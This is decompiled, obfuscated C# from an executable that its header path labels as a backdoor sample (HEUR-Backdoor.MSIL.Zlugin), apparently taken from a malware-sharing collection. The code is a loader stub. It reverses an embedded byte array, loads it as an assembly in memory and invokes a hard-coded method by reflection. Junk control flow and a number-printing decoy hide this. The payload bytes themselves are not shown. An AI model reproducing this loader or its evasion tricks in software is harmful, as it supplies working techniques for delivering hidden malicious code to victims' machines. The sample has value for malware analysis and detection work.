// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Cyup, Version=19.10.20069.49826, Culture=neutral, PublicKeyToken=null
// MVID: DBA16861-1C9A-4A93-ABC2-BC2375FABA7D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Backdoor.MSIL.Zlugin.gen-756517220093a59e69e6db3de1846896d146600389f742503804f25ba6fa74dd.exe

using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Threading.Tasks;
using System.Timers;

internal sealed class \u0002
{
  private Timer \u0002;
  internal bool \u0003;

  internal \u0002()
  {
    Timer timer = new Timer(20000.0);
    if (true)
      goto label_2;
label_1:
    this.\u0002.Elapsed += new ElapsedEventHandler(this.\u0002);
    this.\u0002.Enabled = true;
    this.\u0002.AutoReset = false;
    return;
label_2:
    this.\u0002 = timer;
    goto label_1;
  }

  private void \u0002(object _param1, ElapsedEventArgs _param2)
  {
    if (false)
      return;
    this.\u0003 = true;
  }

  internal void \u0002()
  {
    \u0002.\u0002 obj1 = new \u0002.\u0002();
    \u0002.\u0002 obj2;
    if (true)
      obj2 = obj1;
    \u0002.\u0002 obj3 = obj2;
    Queue<int> intQueue = new Queue<int>();
    if (true)
      obj3.\u0002 = intQueue;
    // ISSUE: method pointer
    Action action1 = new Action((object) obj2, __methodptr(\u0002));
    Action action2;
    if (true)
      action2 = action1;
    IEnumerable<byte> source = ((IEnumerable<byte>) \u0005.\u0002()).Reverse<byte>();
    Task[] tasks = new Task[3]
    {
      new Task(action2),
      new Task(action2),
      new Task(action2)
    };
    object obj4 = (object) Assembly.Load(source.ToArray<byte>());
    foreach (Task task in tasks)
      task.Start();
    Task.Factory.ContinueWhenAll(tasks, new Action<Task[]>(obj2.\u0002));
    (obj4 as Assembly).GetType("Hgkwtn.Ahspatibwyhsmgipy").InvokeMember("Kccusvvqcksrxlejhrap", BindingFlags.InvokeMethod, (Binder) null, (object) null, (object[]) null);
  }

  private sealed class \u0002
  {
    public Queue<int> \u0002;

    public \u0002()
    {
      if (true)
        ;
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    internal void \u0002()
    {
      int num1 = 0;
      while (true)
      {
        if (true)
          goto label_9;
label_3:
        int num2;
        int num3;
        int num4;
        while (true)
        {
          do
          {
            bool flag;
            do
            {
              do
                ;
              while (false);
              num3 = num2 < 100000 ? 1 : 0;
              if (true)
                goto label_7;
label_5:
              continue;
label_7:
              if (true)
              {
                flag = num3 != 0;
                goto label_5;
              }
              else
                goto label_6;
            }
            while (false);
            if (flag)
            {
              this.\u0002.Enqueue(num2);
              num4 = num2 + 1;
              if (false)
                goto label_4;
            }
            else
              goto label_8;
          }
          while (false);
          num2 = num4;
        }
label_6:
        num1 = num3;
        continue;
label_4:
        num1 = num4;
label_9:
        num2 = num1;
        goto label_3;
      }
label_8:;
    }

    internal void \u0002(Task[] _param1)
    {
label_0:
      while (true)
      {
        int num1;
        do
        {
          int num2 = this.\u0002.Count > 0 ? 1 : 0;
          if (true)
            goto label_11;
label_3:
          bool flag;
          do
          {
            if (true)
            {
              if (!flag)
              {
                if (true)
                {
                  if (true)
                    goto label_5;
                }
                else
                  break;
              }
              num1 = this.\u0002.Dequeue();
              if (true)
                goto label_2;
            }
            else
              goto label_0;
          }
          while (false);
          continue;
label_2:
          continue;
label_11:
          flag = num2 != 0;
          goto label_3;
        }
        while (false);
        Console.WriteLine(num1);
      }
label_5:;
    }
  }
}
